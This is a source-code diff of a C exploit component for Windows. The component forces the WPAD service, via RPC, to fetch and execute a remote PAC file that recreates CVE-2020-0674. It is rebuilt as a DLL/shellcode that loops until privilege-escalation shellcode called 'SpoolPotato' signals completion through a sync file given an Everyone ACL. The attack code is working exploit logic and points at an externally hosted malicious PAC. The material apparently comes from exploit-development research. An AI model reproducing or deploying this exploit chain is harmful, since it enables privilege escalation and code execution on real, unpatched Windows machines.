@@ -12,10 +12,10 @@ BOOL SetEveryoneFileAcl(const wchar_t* FilePath);
 // Global settings
 ////////
 
-#define DEBUG
-#define EXE_BUILD
-//#define DLL_BUILD
-//#define SHELLCODE_BUILD
+//#define DEBUG
+//#define EXE_BUILD
+#define DLL_BUILD
+#define SHELLCODE_BUILD
 #define TARGET_PAC_URL L"https://raw.githubusercontent.com/forrest-orr/ExploitDev/master/Exploits/Re-creations/Internet%20Explorer/CVE-2020-0674/x64/Forrest_Orr_CVE-2020-0674_64-bit.pac"
 #define SYNC_FOLDER L"C:\\ProgramData\\DoubleStarSync"
 #define SYNC_FILE L"C:\\ProgramData\\DoubleStarSync\\DoubleStarSync"
@@ -82,7 +82,6 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
 #ifdef DEBUG
     DebugLog(L"... target PAC URL: %ws", pAutoConfigUrl);
 #endif
-
     // Create the configuration structs used in invoking the GetProxyForUrl method
 
     ProxyResolveUrl.Url = L"http://www.google.com/"; // This may vary, any URL will do since the PAC will not end up configuring a proxy for it anyway and it is the PAC execution itself which yields value
@@ -197,20 +196,79 @@ RPC_STATUS WpadInjectPac(const wchar_t *PacUrl) {
 
 #ifdef DLL_BUILD
 BOOL DllMain(HMODULE hModule, uint32_t dwReason, void *pReserved) {
-    HANDLE hEvent;
-
     switch (dwReason) {
         case DLL_PROCESS_ATTACH:
 #ifdef SHELLCODE_BUILD
-            hEvent = CreateEventW(NULL, TRUE, FALSE, L"DoubleStarSync");
+            /*
+            SpoolPotato/WPAD client synchronization
 
-            while (TRUE) {
-                DebugLog(L"... sending PAC update RPC signal to WPAD...");
-                WpadInjectPac(TARGET_PAC_URL);
+            Oftentimes the WPAD client will be unsuccessful when attempting to trigger the PAC download from
+            the WPAD service (the service will return error 12167). This issue is sporadic, and multiple attempts
+            often yield a successful status from WPAD.
 
-                if (WaitForSingleObject(hEvent, 3000) == WAIT_OBJECT_0) {
-                    DebugLog(L"... received sync signal from SpoolPotato");
-                    break;
+            To solve any potential issues which may arise in the WPAD client, the WPAD client must continue to
+            attempt to trigger the PAC download until it receives confirmation via an event object from within
+            the WPAD service itself: specifically from within a SpoolPotato shellcode executed as a result of
+            the CVE-2020-0674 UAF.
+
+            The WPAD client initially:
+            1. Creates a sync event file/folder and then proceeds to repeatedly make RPC calls to WPAD in a loop
+            2. Between each iteration of the loop it spends several seconds waiting for the signal file it
+               previously created to be deleted by SpoolPotato.
+            3. Once the event file has been deleted the WPAD client ends its loop and terminates.
+
+            Meanwhile the SpoolPotato shellcode:
+            1. Makes its privilege escalation operations.
+            2. Waits for the sync event file to be created by the WPAD client.
+            3. Deletes the event file to signal completion to the WPAD client.
+            4. Terminates itself.
+            */
+
+            if (CreateDirectoryW(SYNC_FOLDER, NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
+                HANDLE hFile = CreateFileW(SYNC_FILE, GENERIC_READ, 0, NULL, CREATE_ALWAYS, 0, NULL);
+
+                if (hFile != INVALID_HANDLE_VALUE) {
+                    CloseHandle(hFile);
+
+                    if (SetEveryoneFileAcl(SYNC_FILE)) {
+#ifdef DEBUG
+                        DebugLog(L"... successfully set Everyone ACL on %ws", SYNC_FILE);
+#endif
+                        while (TRUE) {
+#ifdef DEBUG
+                            DebugLog(L"... sending PAC update RPC signal to WPAD...");
+#endif
+                            RPC_STATUS RpcStatus = WpadInjectPac(TARGET_PAC_URL);
+#ifdef DEBUG
+                            DebugLog(L"... WPAD PAC injection attempt returned RPC status of 0x%08x", RpcStatus);
+#endif
+                            Sleep(3000);
+                            hFile = CreateFileW(SYNC_FILE, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+
+                            if (hFile == INVALID_HANDLE_VALUE) {
+#ifdef DEBUG
+                                DebugLog(L"... received sync signal from code within WPAD");
+#endif
+                                break;
+                            }
+                            else {
+                                CloseHandle(hFile);
+#ifdef DEBUG
+                                DebugLog(L"... timed out waiting on sync signal from code within WPAD");
+#endif
+                            }
+                        }
+                    }
+                    else {
+#ifdef DEBUG
+                        DebugLog(L"... failed to set Everyone ACL on file at %ws", SYNC_FILE);
+#endif
+                    }
+                }
+                else {
+#ifdef DEBUG
+                    DebugLog(L"... failed to create sync file at %ws", SYNC_FILE);
+#endif
                 }
             }
 #else
